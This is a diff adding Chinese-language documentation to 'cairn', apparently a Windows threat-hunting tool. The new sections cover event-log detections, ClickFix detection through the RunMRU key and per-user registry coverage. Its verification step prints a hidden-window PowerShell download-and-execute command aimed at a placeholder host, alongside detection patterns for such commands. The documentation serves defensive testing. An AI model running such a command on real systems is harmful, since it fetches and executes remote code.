@@ -33,6 +33,28 @@
 
 嚴重度規則：有項目或非預設項目一律先算 Medium；目標未簽章、位於使用者可寫入路徑或偽裝成系統程式時升為 High。同一筆有兩個以上訊號，或對應的程式正在執行、留有執行紀錄時，會再升一級。
 
+## 事件記錄：內建偵測（不需要 Sigma 規則）
+
+這些事件 Windows 預設就會寫入，不需要安裝 Sysmon；即使 `rules\sigma` 不在，也會讀取 Security、System 和 Defender Operational 這三個記錄。
+
+| 技術 | 事件 | 判斷方式 |
+|---|---|---|
+| T1070.001 | Security 1102、System 104（記錄被清除） | 一律報 High |
+| T1543.003 | System 7045（新安裝服務） | 指令在使用者可寫入路徑、呼叫 cmd／powershell／mshta 等，或含下載／編碼語法：High；不在 Windows 或 Program Files 下：Medium；其他：Low |
+| T1053.005 | Security 4698（新建排程工作，需開啟「其他物件存取」稽核） | 同上，看 TaskContent 裡的 Command 和 Arguments |
+| T1562.001 | Defender 5001（即時保護被關閉）、5007（新增排除項目） | 一律報 High |
+| — | Defender 1116（偵測到惡意程式） | 依威脅名稱與路徑合併成一筆，報 High |
+
+## 初始入侵：ClickFix（T1204.004）
+
+假驗證碼、假錯誤頁面會要求使用者按 Win+R 貼上指令。Explorer 會把「執行」對話框輸入過的內容存在 `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`。cairn 會讀所有已登入使用者的這個機碼：呼叫 powershell、mshta、cmd、curl 等並帶參數的報 Medium；同時含下載、編碼、網址或隱藏視窗的報 High。單純的 `cmd`、`notepad`、網路路徑不報。
+
+驗證：在 VM 上按 Win+R 輸入 `powershell -w h -c "iwr http://example.invalid/a.ps1 | iex"`（網址不存在，不會真的下載），再執行 cairn，應該看到一筆 High 的 T1204.004。
+
+## 每位使用者的位置
+
+Run／RunOnce、COM 劫持、登入腳本、螢幕保護程式、cmd AutoRun、RunMRU 會讀 `HKEY_USERS` 底下每個已載入的使用者，不只是執行 cairn 的那個帳號；Startup 資料夾和 PowerShell profile 會檢查 `C:\Users` 下每個使用者。所以資訊人員用自己的管理員帳號提權執行時，也看得到受害使用者的項目（前提是該使用者目前已登入，或其登錄檔已載入）。
+
 ## 其他內建偵測
 
 - 行程：Office 或腳本宿主產生 shell（T1059）、編碼或下載型 PowerShell（T1059.001）、LOLBin 帶可疑參數（T1218）、系統程式名稱偽裝（T1036.005）。
